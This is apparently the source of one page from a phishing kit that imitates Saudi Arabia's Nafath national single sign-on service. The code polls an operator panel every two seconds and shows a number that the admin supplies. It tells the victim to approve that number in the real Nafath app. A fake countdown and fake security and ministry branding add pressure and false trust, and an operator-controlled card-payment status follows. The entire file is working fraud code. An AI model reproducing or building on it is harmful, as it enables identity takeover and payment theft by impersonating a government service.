import { SiteLayout } from "@/components/SiteLayout";
import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";
import { useEffect, useState } from "react";
import { trpc } from "@/lib/trpc";
import { getSessionId, useStepSession } from "@/lib/useStepSession";
import { ShieldCheck, Smartphone, Clock, RefreshCw } from "lucide-react";

/**
 * صفحة عرض رقم نفاذ:
 * - تعرض الرقم الذي أرسله الأدمن في بطاقة كبيرة
 * - عداد تنازلي 169 ثانية
 * - يستمر الـ polling: لو غيّر الأدمن الرقم، يتحدث في الواجهة فوراً
 * - زر "تأكيد" يضع cardStatus=pending ويعيد التوجيه لصفحة الانتظار
 * - يعود لصفحة /nafath-wait تلقائياً إذا أزال الأدمن الرقم
 */
export default function NafathCode() {
  const [, setLocation] = useLocation();
  const [sessionId] = useState<string>(() => getSessionId());
  const [timeLeft, setTimeLeft] = useState(169); // 169 ثانية
  const { recordStep, isSubmitting } = useStepSession();

  const setCardStatusMutation = trpc.liveVisitors.setCardStatus.useMutation();

  const { data: state } = trpc.liveVisitors.getControlState.useQuery(
    { sessionId },
    { refetchInterval: 2000, refetchIntervalInBackground: true }
  );

  const nafathNumber = state?.nafathNumber ?? null;

  // عداد تنازلي
  useEffect(() => {
    if (timeLeft <= 0) return;
    const t = setInterval(() => setTimeLeft((p) => p - 1), 1000);
    return () => clearInterval(t);
  }, [timeLeft]);

  // إعادة تشغيل العداد عند تغير الرقم
  useEffect(() => {
    if (nafathNumber) {
      setTimeLeft(169);
    }
  }, [nafathNumber]);

  // العودة لصفحة الانتظار إذا أزال الأدمن الرقم
  useEffect(() => {
    if (state && state.nafathNumber === null) {
      setLocation("/nafath-wait");
    }
    // إذا قرر الأدمن البطاقة مرفوضة هنا، يعود لصفحة إعادة المحاولة
    if (state?.cardStatus === "rejected") {
      setLocation("/cardpayment-error");
    }
    if (state?.cardStatus === "approved") {
      // النهاية: لصفحة شكر
      setLocation("/thankyou");
    }
  }, [state, setLocation]);

  const handleConfirm = async () => {
    if (!nafathNumber) return;
    await recordStep("nafath_confirm", { confirmedNumber: nafathNumber });
    // إشعار الأدمن بأن المستخدم ضغط تأكيد - عبر cardStatus pending
    try {
      await setCardStatusMutation.mutateAsync({ sessionId, status: "pending" });
    } catch (e) {
      // غير حرج
    }
    // ينقل المستخدم لصفحة انتظار البطاقة (في انتظار قبول/رفض الأدمن النهائي)
    setLocation("/card-wait");
  };

  return (
    <SiteLayout bare>
      <div className="min-h-screen bg-white" dir="rtl">
        {/* الهيدر */}
        <header className="bg-white border-b-4 border-emerald-600 py-6 shadow-sm">
          <div className="container max-w-5xl mx-auto px-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <ShieldCheck className="w-6 h-6 text-emerald-700" />
              <div>
                <p className="text-[11px] text-gray-500 font-bold">المنصة الوطنية للنفاذ الوطني الموحد</p>
                <p className="text-[10px] text-gray-400">National Single Sign-On</p>
              </div>
            </div>
            <NafathLogo />
          </div>
        </header>

        <main className="container max-w-2xl mx-auto px-4 py-12">
          {/* بانر العداد */}
          <div className="text-center mb-6">
            <h2 className="text-2xl md:text-3xl font-extrabold text-emerald-700 leading-tight">
              تنتهي مهلة الرسائل المؤقتة
              <br />
              <span className="text-xl md:text-2xl">
                في خلال{" "}
                <span className="font-mono">{timeLeft}</span> ثوانٍ / ثانية
              </span>
            </h2>
          </div>

          {/* بطاقة الرقم */}
          <div className="bg-white border-2 border-gray-200 rounded-3xl shadow-2xl overflow-hidden">
            <div className="h-2 bg-gradient-to-r from-emerald-500 via-emerald-600 to-emerald-700" />

            <div className="p-8 md:p-10 text-center">
              <p className="text-base text-gray-700 mb-2">
                يرجى اختيار الرقم الآتي في تطبيق <span className="font-bold text-emerald-700">نفاذ</span>
              </p>
              <div className="flex items-center justify-center gap-2 text-xs text-gray-500 mb-6">
                <Smartphone className="w-4 h-4" />
                <span>افتح التطبيق على جوالك واختر الرقم الظاهر بالأسفل</span>
              </div>

              {/* البطاقة الكبيرة للرقم */}
              <div className="mx-auto mb-6 w-44 h-44 md:w-52 md:h-52 rounded-3xl border-4 border-emerald-600 bg-gradient-to-br from-white to-emerald-50/30 shadow-2xl flex items-center justify-center relative overflow-hidden">
                {/* خلفية زخرفية */}
                <div className="absolute top-0 left-0 w-20 h-20 bg-emerald-100 rounded-full -translate-x-8 -translate-y-8 blur-2xl opacity-60" />
                <div className="absolute bottom-0 right-0 w-20 h-20 bg-amber-100 rounded-full translate-x-8 translate-y-8 blur-2xl opacity-60" />

                {nafathNumber ? (
                  <span
                    key={nafathNumber}
                    className="relative text-7xl md:text-8xl font-extrabold text-emerald-700 font-mono"
                    style={{
                      animation: "scaleIn 0.4s cubic-bezier(0.23, 1, 0.32, 1)",
                    }}
                  >
                    {nafathNumber}
                  </span>
                ) : (
                  <RefreshCw className="w-12 h-12 text-emerald-500 animate-spin" />
                )}
              </div>

              {/* الموقت كشريط */}
              <div className="max-w-xs mx-auto mb-6">
                <div className="flex items-center justify-between text-xs text-gray-500 mb-1.5">
                  <span className="flex items-center gap-1">
                    <Clock className="w-3 h-3" />
                    الوقت المتبقي
                  </span>
                  <span className="font-mono font-bold text-gray-700">{timeLeft}s</span>
                </div>
                <div className="h-2 bg-gray-100 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-emerald-500 to-emerald-700 transition-all duration-1000"
                    style={{ width: `${(timeLeft / 169) * 100}%` }}
                  />
                </div>
              </div>

              {/* الأزرار */}
              <div className="space-y-3 max-w-md mx-auto">
                <Button
                  onClick={handleConfirm}
                  disabled={!nafathNumber || isSubmitting}
                  size="lg"
                  className="w-full bg-gradient-to-r from-emerald-600 to-emerald-700 hover:from-emerald-700 hover:to-emerald-800 disabled:from-gray-400 disabled:to-gray-500 font-bold h-12 shadow-md active:scale-[0.98] transition-transform duration-150"
                  style={{ transitionTimingFunction: "cubic-bezier(0.23, 1, 0.32, 1)" }}
                >
                  تأكيد
                </Button>
                <Button
                  onClick={() => setLocation("/nafath-wait")}
                  variant="outline"
                  size="lg"
                  className="w-full font-bold h-12 border-gray-300 bg-white hover:bg-gray-50"
                >
                  لم يصلني الرمز - أعد المحاولة
                </Button>
              </div>
            </div>

            <div className="bg-gray-50 border-t border-gray-100 px-8 py-4 flex items-center justify-between text-xs text-gray-500">
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
                اتصال مشفّر وآمن
              </div>
              <div className="font-mono text-[10px]">
                Powered by <span className="text-emerald-700 font-bold">Nafath</span>
              </div>
            </div>
          </div>

          <p className="text-center text-[11px] text-gray-400 mt-8 leading-relaxed">
            النفاذ الوطني الموحد - وزارة الاتصالات وتقنية المعلومات - المملكة العربية السعودية
          </p>
        </main>
      </div>

      {/* انيميشن دخول الرقم */}
      <style>{`
        @keyframes scaleIn {
          0% { transform: scale(0.95); opacity: 0; }
          100% { transform: scale(1); opacity: 1; }
        }
      `}</style>
    </SiteLayout>
  );
}

function NafathLogo() {
  return (
    <div className="flex items-center gap-2">
      <span className="text-2xl md:text-3xl font-extrabold text-emerald-700" style={{ fontFamily: "'Tajawal', sans-serif" }}>
        نفاذ
      </span>
      <span className="text-[10px] text-gray-400 font-bold">Nafath</span>
    </div>
  );
}
